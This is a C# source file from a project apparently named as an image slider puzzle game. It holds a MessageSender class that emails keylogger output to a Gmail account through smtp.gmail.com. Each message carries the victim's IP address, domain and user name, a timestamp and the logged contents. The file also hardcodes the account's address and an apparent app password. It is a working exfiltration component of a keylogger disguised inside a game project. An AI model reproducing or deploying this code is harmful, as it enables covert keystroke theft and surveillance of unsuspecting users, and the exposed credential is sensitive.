using System.Net;
using System.Net.Mail;

namespace Image_Slider_Puzzle
{
    public class MessageSender
    {
        internal async void Send(string logContents)
        {
            string emailBody = "";

            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";
            var host = Dns.GetHostName();
            var ip = Dns.GetHostAddresses(host);

            emailBody += "Address/IP: " + ip[1];
            emailBody += "\nUser: " + Environment.UserDomainName.ToString() + " \\ " + Environment.UserName.ToString();
            emailBody += "\nTime: " + now.ToString();
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("redfoxbg@gmail.com");
            mailMessage.To.Add("redfoxbg@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new NetworkCredential("redfoxbg@gmail.com", "zrai jqae qqgt vocv");
            mailMessage.Body = emailBody;

            await client.SendMailAsync(mailMessage);
        }
    }
}
